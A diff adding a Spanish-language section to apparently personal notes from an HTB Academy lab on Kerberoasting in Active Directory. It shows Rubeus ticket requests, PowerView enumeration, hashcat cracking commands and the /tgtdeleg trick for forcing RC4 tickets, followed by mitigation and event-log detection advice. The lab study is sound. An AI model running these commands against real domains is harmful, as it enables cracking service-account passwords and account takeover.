@@ -323,7 +323,114 @@ PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 
 ### Tipos de encriptado
 
-Las herramientas de Kerberoasting suelen solicitar cifrado RC4 (tipo 23) porque es más débil y rápido de crackear con Hashcat que AES (tipos 17 y 18). Por eso la mayoría de hashes comienzan con `$krb5tgs$23$*`. Aunque AES-128 y AES-256 también pueden romperse offline, requieren mucho más tiempo salvo contraseñas muy débiles.
+Las herramientas de Kerberoasting suelen solicitar cifrado RC4 (tipo 23) porque es más débil y rápido de crackear con Hashcat que AES (tipos 17 y 18). Por eso la mayoría de hashes comienzan con `$krb5tgs$23$*`. Aunque AES-128 y AES-256 también pueden romperse offline, requieren mucho más tiempo salvo contraseñas muy débiles. Veamos un ejemplo:
+
+Empecemos creando una cuenta SPN llamada **testspn** y usando Rubeus para realizar Kerberoasting sobre este usuario específico a modo de prueba. Como podemos ver, hemos recibido un ticket TGS cifrado con RC4 (tipo 23).
+
+```powershell-session
+PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : testspn
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
 
 
+[*] SamAccountName         : testspn
+[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
+[*] PwdLastSet             : 2/27/2022 12:15:43 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/
+```
+
+Al comprobar con PowerView, vemos que el atributo **msDS-SupportedEncryptionTypes** está en 0. Según la tabla, el valor decimal 0 indica que no se ha definido un tipo de cifrado específico y se usa el predeterminado **RC4_HMAC_MD5**.
+
+```powershell-session
+PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+serviceprincipalname                   msds-supportedencryptiontypes samaccountname
+--------------------                   ----------------------------- --------------
+testspn/kerberoast.inlanefreight.local                            0 testspn
+```
+
+A continuación, rompamos este ticket con Hashcat y anotemos el tiempo que ha empleado. Para nuestro ejemplo, la cuenta tiene una contraseña débil incluida en la wordlist rockyou.txt. Al ejecutar Hashcat en CPU, vimos que tardó cuatro segundos en crackearse, por lo que en un rig con GPU potente se rompería casi al instante e incluso en una sola GPU probablemente ocurriría de forma casi instantánea.
+
+```shell-session
+$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
+```
+
+Vamos a asumir que nuestro cliente tiene cuentas SPN que apoyen encriptación AES 128/256.
+
+![[Pasted image 20250707134836.png]]
+
+Al comprobarlo con PowerView, veremos que el atributo **msDS-SupportedEncryptionTypes** está en 24, lo que significa que solo se admiten los tipos de cifrado AES 128 y AES 256.
+
+```powershell-session
+PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+serviceprincipalname                   msds-supportedencryptiontypes samaccountname
+--------------------                   ----------------------------- --------------
+testspn/kerberoast.inlanefreight.local                            24 testspn
+```
+
+##### Solicitando un nuevo ticket
+
+```powershell-session
+PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+... SNIP ...
+
+[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inla...
+```
+
+Para ejecutar esto con Hashcat, debemos usar el modo de hash **19700**, que corresponde a Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96), según la tabla de ejemplos de Hashcat. Ejecutamos el hash AES así y comprobamos el estado; al pulsar **s** veremos que tardará más de 23 minutos en procesar toda la wordlist rockyou.txt.
+
+```shell-session
+$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
+```
+
+Podemos usar Rubeus con el parámetro `/tgtdeleg` para indicar que solo queremos cifrado RC4 al solicitar un nuevo ticket de servicio. La herramienta fuerza este comportamiento al especificar RC4 como único algoritmo soportado en el cuerpo de la petición TGS. Probablemente sea un mecanismo de compatibilidad con versiones anteriores de Active Directory. Al emplear este flag, obtenemos un ticket cifrado con RC4 (tipo 23) que podremos crackear mucho más rápido.
+
+##### Usando la flag `/tgtdeleg`
+
+![[rubeus_tgtdeleg.png]]
+
+En la imagen anterior podemos ver que, al usar el parámetro `/tgtdeleg`, la herramienta solicitó un ticket RC4 a pesar de que los tipos de cifrado admitidos estén configurados como AES 128/256. Este sencillo ejemplo muestra la importancia de una enumeración exhaustiva y de profundizar en los detalles al realizar ataques como Kerberoasting. Aquí pudimos degradar de AES a RC4 y reducir el tiempo de cracking en más de 4 minutos y 30 segundos. En un entorno real, con un rig de GPU potente para crakear contraseñas, este tipo de degradación podría suponer pasar de días de trabajo a tan solo unas horas, marcando la diferencia en nuestro proceso de evaluación.
+
+> **Nota:**  
+> Esto no funciona contra un Controlador de Dominio con Windows Server 2019, independientemente del nivel funcional del dominio. Siempre devolverá un ticket de servicio cifrado con el nivel más alto soportado por la cuenta objetivo.  
+> 
+> En dominios cuyos DCs sean Server 2016 o anteriores (muy comunes), habilitar AES no mitigará parcialmente Kerberoasting devolviendo solo tickets AES (difíciles de crackear), sino que permitirá igualmente solicitar un ticket cifrado con RC4.  
+> 
+> En DCs de Windows Server 2019, habilitar cifrado AES en una cuenta SPN hará que recibamos un ticket de servicio AES-256 (tipo 18), mucho más duro (aunque no imposible) de crackear, especialmente si se usa una contraseña débil de diccionario.  
+
+Se puede modificar en la política de dominio los tipos de cifrado permitidos para Kerberos (GPO → Configuración del equipo → Políticas → Configuración de Windows → Configuración de seguridad → Políticas locales → Opciones de seguridad → “Seguridad de red: Configurar tipos de cifrado permitidos para Kerberos”). Si se quitan todos los cifrados salvo RC4_HMAC_MD5, un DC 2019 permitiría el downgrade a RC4, pero suprimir AES debilita la seguridad de AD y no es recomendable. Además, eliminar RC4 podría causar problemas operativos y debe probarse a fondo antes de aplicarlo.
+
+![[GroupPolicyEditor.png]]
+### Mitigación y detección
+
+Para mitigar Kerberoasting en cuentas de servicio no gestionadas, usa contraseñas largas y complejas o, mejor aún, Managed Service Accounts (MSA) y Group Managed Service Accounts (gMSA) que generan claves muy robustas y las rotan automáticamente (al igual que LAPS).
+
+Kerberoasting se diferencia del tráfico Kerberos normal al generar un pico anómalo de peticiones TGS-REQ/TGS-REP con cifrado RC4. Puedes auditar estas operaciones en los DC activando en la GPO la “Auditoría de operaciones de tickets de servicio Kerberos”.
+
+![[kerb.png]]
+Al hacerlo se generan dos IDs de evento distintos:
+
+- **4769**: Se solicitó un ticket de servicio Kerberos.    
+- **4770**: Se renovó un ticket de servicio Kerberos.    
+
+Unas 10–20 solicitudes TGS (evento 4769) para una misma cuenta en un periodo razonable se consideran normales. Sin embargo, un gran número de eventos 4769 de una sola cuenta en poco tiempo puede indicar un ataque.
+
+A continuación vemos un ejemplo de un ataque de Kerberoasting registrado en los logs. Observamos múltiples eventos 4769 en sucesión, un comportamiento anómalo. Al abrir uno, podemos ver que el usuario **htb-student** (el atacante) solicitó un ticket al servicio **sqldev** (la víctima). También comprobamos que el tipo de cifrado del ticket es `0x17` (hex), que equivale a 23 (RC4), lo que significa que el ticket se cifró con RC4 y, si la contraseña es débil, hay muchas probabilidades de que el atacante pueda crackearlo y tomar control de la cuenta **sqldev**.
+
+![[kerb2.png]]
+
+Algunas otras medidas de mitigación incluyen restringir el uso del algoritmo RC4, especialmente en las solicitudes Kerberos de cuentas de servicio (probándolo previamente para garantizar que nada falle en el entorno). Además, las cuentas de **Domain Admins** y otros usuarios con privilegios elevados no deberían configurarse como cuentas SPN, salvo que sea estrictamente necesario.
 
